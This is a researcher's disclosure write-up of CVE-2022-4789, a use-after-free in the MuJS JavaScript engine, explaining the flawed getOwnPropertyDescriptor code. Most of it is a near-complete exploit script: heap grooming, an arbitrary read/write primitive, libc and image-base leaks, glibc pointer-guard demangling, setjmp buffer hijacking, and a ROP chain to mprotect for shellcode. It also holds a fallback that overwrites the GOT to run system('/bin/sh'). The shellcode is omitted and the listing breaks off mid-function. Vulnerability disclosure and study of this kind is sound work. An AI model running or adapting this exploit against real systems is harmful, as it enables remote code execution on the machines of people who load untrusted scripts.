# INTRO:

JavaScript is a programming language that is primarily used to create interactive and dynamic user interfaces. It is a high-level, interpreted language that is used to create scripts and programs that can run on a wide variety of platforms, including servers, desktop applications, and mobile devices.

One of the key features of JavaScript is its dynamic nature. This means that the language is able to change its behavior at runtime, allowing for more flexibility and adaptability in the programs that are created with it. This is achieved through features such as variable typing, which allows variables to change their type based on the data they contain, and object-oriented programming, which allows for the creation of complex, modular code.

Javascript is used most frequently to power web applications. As such, typical browsers will contain some sort of engine that is used to parse JavaScript files and run them locally. Since these engines are designed to run untrusted remote code, their safety guarantees are of great importance to the end user. MuJS is one such JavaScript engine, primarily designed to add scripting capabilities to software through embedding. It is lightweight, interpreted, and written in c.

CVE-2022-4789 is an issue in MuJS that I found through manual code review. The offical description is given below:

__A logical issue in O_getOwnPropertyDescriptor() in Artifex MuJS 1.0.0 through 1.3.x before 1.3.2 allows an attacker to achieve Remote Code Execution through memory corruption, via the loading of a crafted JavaScript file.__

# THE BUG:

The vulnerability lies in the implementation of the built-in JS Object method ``Object.getOwnPropertyDescriptor()``. The method takes an object and the name of a property as its parameters and returns a property descriptor for that property if it exists. A property descriptor is an object that describes the attributes of a property, such as its value, getter/setter, writability, enumerability, and configurability.

The implementation is defined in ``jsobject.c:O_getOwnPropertyDescriptor()``. The vulnerable code is shown below:

```c
static void O_getOwnPropertyDescriptor(js_State *J)
{
        js_Object *obj;
        js_Property *ref;
        if (!js_isobject(J, 1))
                js_typeerror(J, "not an object");
        obj = js_toobject(J, 1);     
        ref = jsV_getproperty(J, obj, js_tostring(J, 2));  // (0) 
        if (!ref) {
                // TODO: builtin properties (string and array index and length, regexp flags, etc)
                js_pushundefined(J);
        } else {
                js_newobject(J);	// (1)
                if (!ref->getter && !ref->setter) {	// (2)
                        js_pushvalue(J, ref->value);
                        js_setproperty(J, -2, "value");
                        js_pushboolean(J, !(ref->atts & JS_READONLY));
                        js_setproperty(J, -2, "writable");
                } else {
                        if (ref->getter)	// (3)
                                js_pushobject(J, ref->getter);
                        else
                                js_pushundefined(J);
                        js_setproperty(J, -2, "get");
                        if (ref->setter)	// (4)
                                js_pushobject(J, ref->setter);
                        else
                                js_pushundefined(J);
                        js_setproperty(J, -2, "set");
                }
                js_pushboolean(J, !(ref->atts & JS_DONTENUM));
                js_setproperty(J, -2, "enumerable");
                js_pushboolean(J, !(ref->atts & JS_DONTCONF));
                js_setproperty(J, -2, "configurable");
        }
}

```

A summary of the function is as follows:

## (0)

```c
	ref = jsV_getproperty(J, obj, js_tostring(J, 2)); 
```

First, we grab a reference to the property that we are trying to extract the descriptors from. This is done by calling ``jsV_getproperty()`` which returns a pointer to a ``js_Property`` struct on the heap. 

```c
struct js_Property
{
        const char *name;
        js_Property *left, *right;
        int level;
        int atts;
        js_Value value;
        js_Object *getter;
        js_Object *setter;
};
```

This value is cached in the local variable named "ref" for multiple uses later on in the function.

## (1)

```c
	js_newobject(J);
```

Then ``js_newobject()`` gets called which creates a new JS object from the default JS object prototype, Object.prototype, and pushes it onto the interpreter stack. This is the object containing our descriptors that the method will return. (Note: The fact that the object has a prototype will be important later on)

## (2)

```c
    if (!ref->getter && !ref->setter) {
		//...
    } else {
		//vulnerable code path here
    }
```

Next, the property is checked to see if it contains getter/setter functions. JS property getters and setters are custom functions that if defined, are invoked during property retrieval and property assignment respectively. In our exploit, we define a getter and setter function for our property in order to traverse the vulnerable code path. 

## (3)

```c
    if (ref->getter)
    	js_pushobject(J, ref->getter);
    else
        js_pushundefined(J);
    js_setproperty(J, -2, "get");
```
Our defined getter function is then pushed onto the interpreter stack through ``js_pushobject()``. Our JS getter function, represented internally as a ``js_Object`` struct pointer, gets set to a property named "get" in the previously created return object on the interpreter stack. During this property assignment, a call to ``js_setproperty()`` is made. This is the vulnerable line of code. A closer look at ``js_setproperty()``'s call chain reveals the reason.

```c
static void jsR_setproperty(js_State *J, js_Object *obj, const char *name, int transient)
{

/* 
	checks obj type and does some preparations ... 
*/

    ref = jsV_getpropertyx(J, obj, name, &own);
    if (ref) {
        if (ref->setter) {
            js_pushobject(J, ref->setter);
            js_pushobject(J, obj);
            js_pushvalue(J, *value);
            js_call(J, 1);	// calls the setter of Object.prototype.get
            js_pop(J, 1);
            return;

/* 
	some more code ...
*/

}
```

This function calls ``jsR_setproperty()``, which first decides how the value should be set depending on the JS object type, then tries to find a setter for that property. If a setter for that property exists, that setter function is called and the function returns. At first glance, one might think that a setter function for the property named "get" could not exist, as the Object that contains the property was only previously created and is not exposed to the JS interface until ``O_getOwnPropertyDescriptor()`` returns. However, since this object is an instance of Object.prototype, if the property Object.prototype.get was previously defined with a setter function, the prototype chain will get traversed to call our setter, when it actually shouldn't. This can be achieved from JS with the following code:

```JavaScript
	Object.defineProperty(Object.prototype, "get", our_setter_function);
```

Our JS setter function can then delete the property (with the builtin JS delete keyword) that we are currently processing, which frees our property on the heap.

```c
    // Property deletion call chain:
    freeproperty() -> js_free() -> ... -> free( (struct js_Property*) ptr_to_property)
```

The local variable "ref" in ``O_getOwnPropertyDescriptor()``, previously assumed to be immutable, now contains a pointer to a freed heap object--the deleted property!

## (4)

```c
    if (ref->setter)
    	js_pushobject(J, ref->setter);
    else
        js_pushundefined(J);
    js_setproperty(J, -2, "set");
```

Now we need to find a way to exploit this issue. We can actually dereference the pointer to our freed property later on in the function, resulting in a use-after-free (UAF). Returning to ``O_getOwnPropertyDescriptor()``, we can see that the same steps taken, to retrieve and set the getter, are taken if the property that we are currently processing contains a setter as well. The setter field in our now freed ``{struct js_Property*} ref`` variable is dereferenced and pushed onto the interpreter stack. To exploit this, I chose to create a JS string variable with a specific length in the setter function of Object.prototype.get, right after the property deletion.

```JavaScript
    function get_uaf() {
        var pad4buf = "deadbeefbabecafedeadbeefbabecafedeadbeefbabecaf";
        delete victim.temp; // victim.temp is the property we are currently processing
        for (var i=0; i<0x100; i++) {
            fill_buf = "";
            fill_buf = fill_buf.concat(pad4buf);
        }
        return;
    }
```

This overwrites the data of our freed ``js_Property`` struct with the string data. I use this to null out the least-significant-byte of the pointer value, ref->setter, respresented internally as type(``struct js_Object*``). After ``O_getOwnPropertyDescriptor()`` returns the object containing the descriptors to JS, our object will have a property named "set" that internally references an invalid and corrupted heap chunk of type(``struct js_Object``).

```c
struct js_Object
{
        enum js_Class type;
        int extensible;
        js_Property *properties;
        int count; /* number of properties, for array sparseness check */
        js_Object *prototype;
        union {
                int boolean;
                double number;
                struct {
                        const char *string;
                        int length;
                } s;
                struct {
                        int length;
                        int simple; // true if array has only non-sparse array properties
                        int capacity;
                        js_Value *array;
                } a;
                struct {
                        js_Function *function;
                        js_Environment *scope;  //functions have a scope associated with them
                } f;
                struct {
                        const char *name;
                        js_CFunction function;
                        js_CFunction constructor;
                        int length;
                        void *data;
                        js_Finalize finalize;
                } c;
                js_Regexp r;
                struct {
                        js_Object *target;
                        js_Iterator *head;
                } iter;
                struct {
                        const char *tag;
                        void *data;
                        js_HasProperty has;
                        js_Put put;
                        js_Delete delete;
                        js_Finalize finalize;
                } user;
        } u;
        js_Object *gcnext; /* allocation list */
        js_Object *gcroot; /* scan list */
        int gcmark;
};
```

# THE EXPLOIT:

<p> To recap, we can trigger the UAF from JS with the following sample code. </p>

```JavaScript
    var victim = {
        get temp() {
            return;
        },
        set temp(val) {
            return;
        }
    }

    function get_uaf() {
        var pad4buf = "deadbeefbabecafedeadbeefbabecafedeadbeefbabecaf";
        delete victim.temp;
        for (var i=0; i<0x100; i++) {
            fill_buf = "";
            fill_buf = fill_buf.concat(pad4buf);
        }
        return;
    }

    //trigger vuln
    var uaf_setter = {set: get_uaf};
    Object.defineProperty(Object.prototype, "get", uaf_setter);
    var res = Object.getOwnPropertyDescriptor(victim, "temp");
    var fake_obj = res.set; // our corrupted object is here
```

The first step in our exploit is to figure out the offset between the real valid pointer to the heap allocated setter function and our invalid LSB-nulled pointer. To achieve this, we create a JS array within the victim object and try to force its internal heap representation to be allocated at an address right below our original setter function. This causes our array to overlap with our invalid setter function on the heap.

```JavaScript
    var victim = {
        get temp() {
            return;
        },
        headers: [js_fun, js_fun, js_fun, js_fun, js_fun, js_fun, js_fun, js_fun, js_fun, js_fun, js_fun, js_fun, js_fun, js_obj, js_obj, js_obj], //this is our array allocated below the setter
        set temp(val) {
            return;
        }
    }
```

This requires prior heap grooming to defragment the heap, clear up the bins, and force new allocations to come from the top chunk. We do this by simply creating a bunch of JS arrays, which result in a lot of internal heap allocations.

```JavaScript
function reset_heap(size) {
	log("Spraying heap.");
	var padding = new Array(size);
	for (var i=0; i<size/2; i++) {
		padding[i] = true;
	}
	for (var i=size/2; i<size; i++) {
		padding[i] = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 1, 2, 3, 4, 5];
	}
	return padding;
}
```

Afterwards, we can abuse the JS typeof() function to figure out the offset by manipulating the values in each array index. The JS typeof() function works internally by reading the first field of the ``js_Object`` struct it is checking, which contains a value of type(``enum js_Class``). We can use this to figure out the index in our array that the fake ``{struct js_Object*}`` setter starts at by manipulating array values and checking them with typeof(). Knowing the offset, we can corrupt other field values in our struct using assignments to our array, crafting us an arbritary read/write primitive. To create our arbritrary r/w primitive, we first change the "type" field of our ``{struct js_Object*}`` setter to indicate that it is an instance of a JS Array(). Then we change the struct's field "array", which contains a pointer to a buffer containing the values, to whatever pointer value we want.

```JavaScript
    // victim.headers is our array, fake_obj is our corrupted JS setter function
    victim.headers[off] = js_arr;
    victim.headers[off+2] = fake_arr_field;
	
    // arb READ
    victim.headers[off+3] = addr_to_leak;
    var leaked_addr = u64(fake_obj[0]);
	
    // arb WRITE
    victim.headers[off+3] = addr_to_write;
    fake_obj[0] = contents;
```

To leak the imagebase, we use the special "sentinel" value. This global variable (resides in .data section) is used internally by the engine to indicate the abscence of a defined JS value, and is present in many areas on the heap. After leaking the imagebase, we can leak the libcbase by reading addresses from the global offset table. From here, we could do a standard Global Offset Table (GOT) overwrite to modify control flow if the binary is not compiled with full RELRO. By default, mujs is compiled with partial RELRO, which does nothing to prevent GOT overwrites. However, if the compile time options were modified to add full RELRO instead, this would not work. Luckily, we can abuse the way mujs implements JS exception handling in its engine. Mujs uses the c functions ``setjmp()`` and ``longjmp()``, which perform nonlocal gotos, as its core mechanism to catch JS exceptions. These functions are implemented in asm, and the implementation of ``setjmp()`` in x86_64 is shown below:

```c
ENTRY (__sigsetjmp)
        /* Save registers.  */
        movq %rbx, (JB_RBX*8)(%rdi)
#ifdef PTR_MANGLE
# ifdef __ILP32__
        /* Save the high bits of %rbp first, since PTR_MANGLE will
           only handle the low bits but we cannot presume %rbp is
           being used as a pointer and truncate it.  Here we write all
           of %rbp, but the low bits will be overwritten below.  */
        movq %rbp, (JB_RBP*8)(%rdi)
# endif
        mov %RBP_LP, %RAX_LP
        PTR_MANGLE (%RAX_LP)
        mov %RAX_LP, (JB_RBP*8)(%rdi)
#else
        movq %rbp, (JB_RBP*8)(%rdi)
#endif
        movq %r12, (JB_R12*8)(%rdi)
        movq %r13, (JB_R13*8)(%rdi)
        movq %r14, (JB_R14*8)(%rdi)
        movq %r15, (JB_R15*8)(%rdi)
        lea 8(%rsp), %RDX_LP    /* Save SP as it will be after we return.  */
#ifdef PTR_MANGLE
        PTR_MANGLE (%RDX_LP)
#endif
        movq %rdx, (JB_RSP*8)(%rdi)
        mov (%rsp), %RAX_LP     /* Save PC we are returning to now.  */
        LIBC_PROBE (setjmp, 3, LP_SIZE@%RDI_LP, -4@%esi, LP_SIZE@%RAX_LP)
#ifdef PTR_MANGLE
        PTR_MANGLE (%RAX_LP)
#endif
        movq %rax, (JB_PC*8)(%rdi)

#ifdef SHADOW_STACK_POINTER_OFFSET
# if IS_IN (libc) && defined SHARED && defined FEATURE_1_OFFSET
        /* Check if Shadow Stack is enabled.  */
        testl $X86_FEATURE_1_SHSTK, %fs:FEATURE_1_OFFSET
        jz L(skip_ssp)
# else
        xorl %eax, %eax
# endif
        /* Get the current Shadow-Stack-Pointer and save it.  */
        rdsspq %rax
        movq %rax, SHADOW_STACK_POINTER_OFFSET(%rdi)
# if IS_IN (libc) && defined SHARED && defined FEATURE_1_OFFSET
L(skip_ssp):
# endif
#endif
#if IS_IN (rtld)
        /* In ld.so we never save the signal mask.  */
        xorl %eax, %eax
        retq
#else
        /* Make a tail call to __sigjmp_save; it takes the same args.  */
        jmp __sigjmp_save
#endif
END (__sigsetjmp)

```

These gotos are achieved by ``longjmp()`` restoring a previously saved state of registers from a buffer created by ``setjmp(jmp_buf env)``. By default in glibc, most of these register values are encrypted using glibc ptr mangling, including the instruction pointer, stack pointer, and base pointer. Luckily for us again, glibc ptr mangling's encryption is quite weak. All it does is XOR the unencrypted value with the ``ptr_guard`` variable, allocated in the thread specific .tls section, and rotate it a couple of bits.

```c
/* Pointer mangling support.  */
#if IS_IN (rtld)
/* We cannot use the thread descriptor because in ld.so we use setjmp
   earlier than the descriptor is initialized.  */
# ifdef __ASSEMBLER__
#  define PTR_MANGLE(reg)       xor __pointer_chk_guard_local(%rip), reg;    \
                                rol $2*LP_SIZE+1, reg
#  define PTR_DEMANGLE(reg)     ror $2*LP_SIZE+1, reg;                       \
                                xor __pointer_chk_guard_local(%rip), reg
# else
#  define PTR_MANGLE(reg)       asm ("xor __pointer_chk_guard_local(%%rip), %0\n" \
                                     "rol $2*" LP_SIZE "+1, %0"                   \
                                     : "=r" (reg) : "0" (reg))
#  define PTR_DEMANGLE(reg)     asm ("ror $2*" LP_SIZE "+1, %0\n"                 \
                                     "xor __pointer_chk_guard_local(%%rip), %0"   \
                                     : "=r" (reg) : "0" (reg))
# endif
#else
# ifdef __ASSEMBLER__
#  define PTR_MANGLE(reg)       xor %fs:POINTER_GUARD, reg;                   \
                                rol $2*LP_SIZE+1, reg
#  define PTR_DEMANGLE(reg)     ror $2*LP_SIZE+1, reg;                        \
                                xor %fs:POINTER_GUARD, reg
# else
#  define PTR_MANGLE(var)       asm ("xor %%fs:%c2, %0\n"                     \
                                     "rol $2*" LP_SIZE "+1, %0"               \
                                     : "=r" (var)                             \
                                     : "0" (var),                             \
                                       "i" (offsetof (tcbhead_t,              \
                                                      pointer_guard)))
#  define PTR_DEMANGLE(var)     asm ("ror $2*" LP_SIZE "+1, %0\n"             \
                                     "xor %%fs:%c2, %0"                       \
                                     : "=r" (var)                             \
                                     : "0" (var),                             \
                                       "i" (offsetof (tcbhead_t,              \
                                                      pointer_guard)))
# endif
#endif
```

Therefore if we know the unencrypted value of one of the saved registers, we can leak the ``ptr_guard`` variable value by reversing the encryption process. 

```Javascript
//glibc ptr demangling
function ptr_demangle(ptr, key) {
	var rot = ror(ptr, 0x11, 64);
	var rot_u = parseInt(rot.substring(0, 8), 16);
	var rot_l = parseInt(rot.substring(8, 16), 16);
	var key_u = parseInt(key.substring(0, 8), 16);
	var key_l = parseInt(key.substring(8, 16), 16);
	var res_u = (rot_u ^ key_u);
	var res_l = (rot_l ^ key_l);
	if (res_u < 0) {
		res_u = 0xffffffff + res_u + 1;
	}
	if (res_l < 0) {
		res_l = 0xffffffff + res_l + 1;
	}
	res_u = ljust(res_u.toString(16), 4);
	res_l = ljust(res_l.toString(16), 4);
	return res_u + res_l;
}

//glibc ptr mangling
function ptr_mangle(ptr, key) {
	var key_u = parseInt(key.substring(0, 8), 16);
	var key_l = parseInt(key.substring(8, 16), 16);
	var ptr_u = parseInt(ptr.substring(0, 8), 16);
	var ptr_l = parseInt(ptr.substring(8, 16), 16);
	var xored_u = (ptr_u ^ key_u);
	var xored_l = (ptr_l ^ key_l);
	if (xored_u < 0) {
		xored_u = 0xffffffff + xored_u + 1;
	}
	if (xored_l < 0) {
		xored_l = 0xffffffff + xored_l + 1;
	}
	xored_u = ljust(xored_u.toString(16), 4);
	xored_l = ljust(xored_l.toString(16), 4);
	var xored = xored_u + xored_l;
	return rol(xored, 0x11, 64);
}

```

Whenever we load a .js file into mujs, the JS state is saved incase of an exception/error. The buffer containing the values of the saved registers is stored within an array in the process's current ``js_State``, represented by the variable {``struct js_State*``} J.

```c
/* State struct */

struct js_State
{
	void *actx;
	void *uctx;
	js_Alloc alloc;
	js_Report report;
	js_Panic panic;

	js_StringNode *strings;

	int default_strict;
	int strict;

	/* parser input source */
	const char *filename;
	const char *source;
	int line;

	/* lexer state */
	struct { char *text; int len, cap; } lexbuf;
	int lexline;
	int lexchar;
	int lasttoken;
	int newline;

	/* parser state */
	int astdepth;
	int lookahead;
	const char *text;
	double number;
	js_Ast *gcast; /* list of allocated nodes to free after parsing */

	/* runtime environment */
	js_Object *Object_prototype;
	js_Object *Array_prototype;
	js_Object *Function_prototype;
	js_Object *Boolean_prototype;
	js_Object *Number_prototype;
	js_Object *String_prototype;
	js_Object *RegExp_prototype;
	js_Object *Date_prototype;

	js_Object *Error_prototype;
	js_Object *EvalError_prototype;
	js_Object *RangeError_prototype;
	js_Object *ReferenceError_prototype;
	js_Object *SyntaxError_prototype;
	js_Object *TypeError_prototype;
	js_Object *URIError_prototype;

	unsigned int seed; /* Math.random seed */

	int nextref; /* for js_ref use */
	js_Object *R; /* registry of hidden values */
	js_Object *G; /* the global object */
	js_Environment *E; /* current environment scope */
	js_Environment *GE; /* global environment scope (at the root) */

	/* execution stack */
	int top, bot;
	js_Value *stack;

	/* garbage collector list */
	int gcpause;
	int gcmark;
	unsigned int gccounter, gcthresh;
	js_Environment *gcenv;
	js_Function *gcfun;
	js_Object *gcobj;
	js_String *gcstr;

	js_Object *gcroot; /* gc scan list */

	/* environments on the call stack but currently not in scope */
	int envtop;
	js_Environment *envstack[JS_ENVLIMIT];

	/* debug info stack trace */
	int tracetop;
	js_StackTrace trace[JS_ENVLIMIT];

	/* exception stack */
	int trytop;
	js_Jumpbuf trybuf[JS_TRYLIMIT];
};
```

This is a heap allocated object. We can leak the address of the current ``js_State`` and use that to read the encrypted register values by again abusing the file loading mechanism. When a file is loaded, mujs allocates a new ``js_State`` and pushes some global JS functions on the heap. These global functions can be referenced from JS and lie at a certain offset from the ``js_State``. We leak these addresses with our read primitives, allowing us to view the mangled register values. We can now index to the first entry in our array of jmp_bufs, and read the mangled value of the instruction pointer. We actually know the unencrypted value of this pointer since, as previously stated, mujs will first save its state in the ``js_State`` struct after loading a file, which happens in a specific file loading function that we know the address of.

All we need to do now is reverse the encryption process and recover the ``ptr_guard`` value. We can now perform a nonlocal goto wherever address we want, by throwing a JS exception after modifying the saved registers. I chose to use the ropchain+shellcode Wombo Combo, with the seeded ropchain calling ``mprotect()`` on my shellcode then jumping to it for RCE.

One last thing you may be wondering about is how we survive garbage collection without crashing throughout the exploit. Mujs has a quirk where its implementation of the JS builtin method, Array.sort(), allows us to pause the garbage collector until that function returns. 

```c
static void Ap_sort(js_State *J)
{
	struct sortslot * volatile array = NULL;
	int i, n, len;

	len = js_getlength(J, 0);
	if (len <= 0) {
			js_copy(J, 0);  
			return; 
	}

	if (len >= INT_MAX / (int)sizeof(*array))
			js_rangeerror(J, "array is too large to sort");

	/* Holding objects where the GC cannot see them is illegal, but if we
	 * don't allow the GC to run we can use qsort() on a temporary array of
	 * js_Values for fast sorting.
	 */
	++J->gcpause;	// GC pause happens here

	/*
	more sorting function code 
	...
	...
	*/

}
```

We simply run our exploit from within that function to avoid dealing with the GC, as shown below.

```Javascript
    var array = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 1, 2, 3, 4, 5];
    array.sort(fakesort); //pause the garbage collector, fakesort is the function that contains our actual exploit code
```

# Credits:

Special thanks to Karim Rahal and Jeffrey Hertzog for giving feedback and edits, and ChatGPT for helping me write the intro.

# Exploit code (shellcode not included):

```JavaScript
var bail = false;
var debug = true;

//print logs for debugging
function log(str) {
	if (debug === true)
		print(str + "\n");
}

//convert hex string to binary representation
function hex2bin(str) {
	bin_u = parseInt(str.substring(0, 8), 16).toString(2);
	bin_l = parseInt(str.substring(8, 16), 16).toString(2);
	return ljust(bin_u, 16) + ljust(bin_l, 16);
}

//helper function for getting addresses
function add_off(base, off) {
	return ljust((parseInt(base, 16) + off).toString(16), 8);
}

//rotate right
function ror(val, shift, sz) {
	var bits = hex2bin(val);
	bits = bits.substring(sz-shift, sz) + bits.substring(0, sz-shift);
	var bits_u = ljust(parseInt(bits.substring(0, sz/2), 2).toString(16), 4);
	var bits_l = ljust(parseInt(bits.substring(sz/2, sz), 2).toString(16), 4);
	return bits_u + bits_l;
}

//rotate left
function rol(val, shift, sz) {
	var bits = hex2bin(val);
	bits = bits.substring(shift, sz) + bits.substring(0, shift);
	var bits_u = ljust(parseInt(bits.substring(0, sz/2), 2).toString(16), 4);
	var bits_l = ljust(parseInt(bits.substring(sz/2, sz), 2).toString(16), 4);
	return bits_u + bits_l;
}

//glibc ptr demangling
function ptr_demangle(ptr, key) {
	var rot = ror(ptr, 0x11, 64);
	var rot_u = parseInt(rot.substring(0, 8), 16);
	var rot_l = parseInt(rot.substring(8, 16), 16);
	var key_u = parseInt(key.substring(0, 8), 16);
	var key_l = parseInt(key.substring(8, 16), 16);
	var res_u = (rot_u ^ key_u); 
	var res_l = (rot_l ^ key_l);
	if (res_u < 0) {
		res_u = 0xffffffff + res_u + 1;
	}
	if (res_l < 0) {
		res_l = 0xffffffff + res_l + 1;
	}
	res_u = ljust(res_u.toString(16), 4);
	res_l = ljust(res_l.toString(16), 4);
	return res_u + res_l;
}

//glibc ptr mangling
function ptr_mangle(ptr, key) {
	var key_u = parseInt(key.substring(0, 8), 16);
	var key_l = parseInt(key.substring(8, 16), 16);
	var ptr_u = parseInt(ptr.substring(0, 8), 16);
	var ptr_l = parseInt(ptr.substring(8, 16), 16);
	var xored_u = (ptr_u ^ key_u);
	var xored_l = (ptr_l ^ key_l);
	if (xored_u < 0) {
		xored_u = 0xffffffff + xored_u + 1;
	}
	if (xored_l < 0) {
		xored_l = 0xffffffff + xored_l + 1;
	}
	xored_u = ljust(xored_u.toString(16), 4);
	xored_l = ljust(xored_l.toString(16), 4);
	var xored = xored_u + xored_l;
	return rol(xored, 0x11, 64);
}

//convert hex sequence to its double representation
function hex2double(str) {
	var frac_0 = "1";
	var sign = parseInt(parseInt(str[0], 16).toString(2)[0], 2);
	var exp = parseInt(str.substring(0, 3), 16);
	if (exp == 0) {
		exp = 1;
		frac_0 = "0";
	}
	var bias = 1023;
	var fracT = parseInt(frac_0 + str.substring(3, 8), 16) * Math.pow(16, 8);
	var fracB = parseInt(str.substring(8, 16), 16);
	var frac = fracT + fracB;
	var res = Math.pow(2, exp-bias) * (frac * Math.pow(2, -52));
	return (sign) ? res * -1 : res;
}

//pack strings
function p64(str) {
	var encoded = "";
	for (var i=0; i<0x10; i+=2) {
		var curr = str.substring(i, i+2);
		if (curr === "00") {
			continue;
		} else if (parseInt(curr, 16) < 0x7f && parseInt(curr, 16) > 0x1f) {
			encoded = String.fromCharCode(parseInt(curr, 16)) + encoded;
		} else {
			encoded = "%" + curr + encoded;
		}
	}
	return decodeURI(encoded);
}

//unpack strings
function u64(str) {
	var encoded = encodeURI(str);
	var decoded = "";
	for (var i=0; i<encoded.length && decoded.length < 0x10; i++) {
		if (encoded[i] === "%") {
			decoded = encoded[i+1] + encoded[i+2] + decoded;
			i += 2;
		} else {
			val = encoded.charCodeAt(i).toString(16);
			val = (val.length < 2) ? "0" + val : val;
			decoded = val + decoded;
		}
	}
	while (decoded.length < 0x10) {
		decoded = "0" + decoded;
	}
	return decoded;
}

//allocate heap objects to reset bins
function reset_heap(size) {
	log("Spraying heap.");
	var padding = new Array(size);
	for (var i=0; i<size/2; i++) {
		padding[i] = true;
	}
	for (var i=size/2; i<size; i++) {
		padding[i] = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 1, 2, 3, 4, 5];
	}
	return padding;
}

//pad left
function ljust(str, sz) {
	while (str.length < sz*2)
		str = "0" + str;
	return str;
}

function fakesort() {

	//get uaf && null out LSB of ptr
	function get_uaf() {
		var pad4buf = "deadbeefbabecafedeadbeefbabecafedeadbeefbabecaf";
		delete victim.temp;
		for (var i=0; i<0x100; i++) {
			fill_buf = "";
			fill_buf = fill_buf.concat(pad4buf);
		}
		return;
	}

	//find fake js_Object offset in array
	function find_offset(arr, obj) {
		var min = 0x0;
		var max = 0xd;
		while (min != max-1) {
			var avg = Math.floor((max + min) / 2);
			for (var i=min; i<avg; i++) {
				obj.headers[i] = js_fun;
			}
			for (var i=avg; i<max; i++) {
				obj.headers[i] = js_obj;
			}
			var type = typeof(arr);
			if (type === "function") {
				max = avg;
			} else {
				min = avg;
			}
		}
		return min;
	}

	//write vals to addr
	function seed_vals(addr, vals) {
		for (var i=vals.length-1; i>=0; i--) {
			victim.headers[off+3] = hex2double(add_off(addr, i*8-8));
			fake_obj[0] = "aaaaaaaa" + p64(vals[i]);
		}
		return;
	}

	//js_Object headers
	var js_obj = 1.0;
	var js_arr = 1.0000000000000002;
	var js_fun = 1.0000000000000004;
	var js_script = 1.0000000000000007;
	var js_cfun = 1.0000000000000009;
	var js_err = 1.000000000000001;
	var js_bool = 1.0000000000000013;
	var js_num = 1.0000000000000016;
	var js_str = 1.0000000000000018;
	var js_regex = 1.000000000000002;
	var js_date = 1.0000000000000022;
	var js_math = 1.0000000000000024;
	var js_json = 1.0000000000000027;
	var js_args = 1.0000000000000029;
	var js_iter = 1.000000000000003;
	var js_user = 1.0000000000000033;

	//variables
	var padding = new Array();
	var limit = 0x50;
	var fill_buf = "";
	var uaf_setter = {set: get_uaf};
	var fake_arr_field = new String();
	fake_arr_field += "000000000";
	var shellcode = "Shellcode goes here ;)";

	//setup
	Object.defineProperty(Object.prototype, "get", uaf_setter);

	while (true) {
		padding.push(reset_heap(0x2000));
		for (var i=0; i<0x7; i++) {
			delete padding[padding.length-1][i];
		}
		var victim = {
			get temp() {
				return;
			},
			headers: [js_fun, js_fun, js_fun, js_fun, js_fun, js_fun, js_fun, js_fun, js_fun, js_fun, js_fun, js_fun, js_fun, js_obj, js_obj, js_obj],
			set temp(val) {
				return;
			}
		}
		//trigger vuln
		var res = Object.getOwnPropertyDescriptor(victim, "temp");
		var fake_obj = res.set;
		var type = typeof(fake_obj);
		if (type === "object") {
			log("Offset too small, retrying.");
			continue;
		} else if (type === "function") {
			//find the offset
			var off = find_offset(fake_obj, victim);
			if (off === 0) {
				log("Setter function is base aligned, retrying.");
				continue;
			}
			log("Offset found: " + off);
			//leak main image base
			victim.headers[off] = js_arr;
			victim.headers[off+2] = fake_arr_field;
			victim.headers[off+3] = print;
			var print_addr = u64(fake_obj[2]);
			var img_base = add_off(print_addr, -0x486b0);
			var got_start = add_off(img_base, 0x54000);
			log("Address of image base: " + img_base);
			//leak libc base
			victim.headers[off+3] = hex2double(got_start);
			var fopen_addr = u64(fake_obj[9]);
			var libc_base = add_off(fopen_addr, -0x7f6b0);
			var mprotect_addr = add_off(libc_base, 0x11ec50);
			var system_addr = add_off(libc_base, 0x50d60);
			log("Address of libc base: " + libc_base);
			//leak heap objects
			victim.headers[off+3] = print;
			var print_obj_addr = u64(fake_obj[0x11]);
			var js_state_obj_addr = add_off(print_obj_addr, -0x1fdf0);
			log("Address of js_State object: " + js_state_obj_addr);
			if (bail) {
				log("Popping a shell.");
				victim.headers[off+3] = hex2double(got_start);
				fake_obj[10] = hex2double(system_addr);
				var rce = load("/bin/sh");
				quit();
			}
			//decode ptr guard value
			var js_dofile_off = add_off(img_base, 0x37b5e);
			var try_buf_base = add_off(js_state_obj_addr, 0x1190);
			var try_buf_off = add_off(try_buf_base, 8);
			victim.headers[off+3] = hex2double(try_buf_off);
			var try_rip_man = u64(fake_obj[3]);
			if (try_rip_man.length < 7) {
				log("Cannot decode ptr guard value.");
				bail = true;
				continue;
			}
			var ptr_guard = ptr_demangle(try_rip_man, js_dofile_off);
			log("Mangled setjmp rip: " + try_rip_man);
			log("Decoded ptr_guard value: " + ptr_guard);
			//seed shellcode
			var exe = new String(decodeURI(shellcode));
			victim.headers[off+3] = exe;
			var shellcode_addr = u64(fake_obj[2]);
			var shellcode_aligned = shellcode_addr.substring(0, 0x10-3) + "000";
			log("Address of shellcode: " + shellcode_addr);
			//gadgets: 
			ret = add_off(img_base, 0x401a);
			poprdi = add_off(img_base, 0x4a19);
			poprsi = add_off(img_base, 0x74cb);
			poprdx = add_off(img_base, 0x3d1b2);
			add_sil_sil = add_off(img_base, 0xb2ce);
			inc_rbx_off = add_off(img_base, 0x38fa3);
			//seed ropchain to call mprotect
			var ropchain_addr = add_off(try_buf_base, 0x300);
			var rop = new Array();
			rop.push(poprdx);
			rop.push(ljust("07", 8));
			rop.push(poprsi);
			rop.push(ljust("1080", 8));
			rop.push(add_sil_sil);
			rop.push(inc_rbx_off);
			rop.push(poprdi);
			rop.push(add_off(shellcode_aligned, -1));
			rop.push(mprotect_addr);
			rop.push(shellcode_addr);
			seed_vals(ropchain_addr, rop);
			log("Address of seeded ropchain: " + ropchain_addr);
			//modify try buffer
			var rbx = add_off(ropchain_addr, 0x77f0fd3b + 0x38);
			var rsp = ptr_mangle(ropchain_addr, ptr_guard);
			var rip = ptr_mangle(ret, ptr_guard);
			log("Mangled sp: " + rsp);
			log("Mangled ip: " + rip);
			victim.headers[off+3] = hex2double(add_off(try_buf_base, 0));
			fake_obj[0] = p64(rbx);
			victim.headers[off+3] = hex2double(add_off(try_buf_base, 7));
			fake_obj[0] = 0;
			victim.headers[off+3] = hex2double(add_off(try_buf_base, 0x30));
			fake_obj[0] = p64(rsp);
			victim.headers[off+3] = hex2double(add_off(try_buf_base, 0x38));
			fake_obj[0] = p64(rip);
			log("Modified setjmp buffer: " + try_buf_base);
			//trigger exception && exec shellcode
			victim.headers[off+3] = hex2double(add_off(js_state_obj_addr, 0x1180));
			fake_obj[0] = decodeURI("aaaaaaaa%01");
